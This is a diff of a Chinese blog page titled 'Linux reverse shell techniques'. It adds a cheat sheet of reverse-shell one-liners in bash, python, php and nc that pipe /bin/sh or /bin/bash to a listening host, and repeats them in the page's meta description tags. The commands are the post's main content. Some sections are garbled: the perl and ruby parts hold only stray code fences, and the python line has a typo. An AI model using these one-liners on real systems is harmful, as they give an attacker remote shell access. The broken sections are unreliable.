@@ -79,19 +79,21 @@
 
 
 
-<meta name="description" content="hello">
+<meta name="description" content="###Bash 反弹1bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/8888 &amp;lt;&amp;amp;2  python 反弹1python -c &amp;apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE);s.connect((&amp;quot;127.0.0.1&amp;quot;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux 反弹shell的姿势">
 <meta property="og:url" content="http://yoursite.com/2019/01/20/Linux 反弹shell的姿势/index.html">
 <meta property="og:site_name" content="Scripyboy&#39;s Blog">
-<meta property="og:description" content="hello">
+<meta property="og:description" content="###Bash 反弹1bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/8888 &amp;lt;&amp;amp;2  python 反弹1python -c &amp;apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE);s.connect((&amp;quot;127.0.0.1&amp;quot;">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/01/public/images/3.jpg">
-<meta property="og:updated_time" content="2019-03-06T07:39:55.192Z">
+<meta property="og:image" content="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-06-075808.png">
+<meta property="og:image" content="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-06-080726.png">
+<meta property="og:image" content="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-22-085659.png">
+<meta property="og:updated_time" content="2019-03-22T09:05:38.343Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="linux 反弹shell的姿势">
-<meta name="twitter:description" content="hello">
-<meta name="twitter:image" content="http://yoursite.com/2019/01/public/images/3.jpg">
+<meta name="twitter:description" content="###Bash 反弹1bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/8888 &amp;lt;&amp;amp;2  python 反弹1python -c &amp;apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE);s.connect((&amp;quot;127.0.0.1&amp;quot;">
+<meta name="twitter:image" content="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-06-075808.png">
 
 
 
@@ -291,7 +293,15 @@
       
 
       
-        <p>hello<br><img src="../../public/images/3.jpg" alt=""></p>
+        <p>###Bash 反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 &lt;&amp;2</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-06-075808.png" alt="&quot;linux&quot;"></p>
+<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE);s.connect((&quot;127.0.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-06-080726.png" alt=""></p>
+<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;127.0.0.1&quot;,1089);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-22-085659.png" alt=""></p>
+<h3 id="perl-反弹"><a href="#perl-反弹" class="headerlink" title="perl 反弹"></a>perl 反弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### nc反弹</span><br></pre></td></tr></table></figure>
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 1089 &gt;/tmp/f //针对阉割版Nc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![](http://scripyboy.oss-cn-hongkong.aliyuncs.com/blog/2019-03-22-090343.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ruby 反弹</span><br></pre></td></tr></table></figure></p>
+<p><code>`</code></p>
 
       
     </div>
@@ -376,8 +386,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -419,6 +438,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#python-反弹"><span class="nav-number">1.</span> <span class="nav-text">python 反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-反弹"><span class="nav-number">2.</span> <span class="nav-text">php 反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl-反弹"><span class="nav-number">3.</span> <span class="nav-text">perl 反弹</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
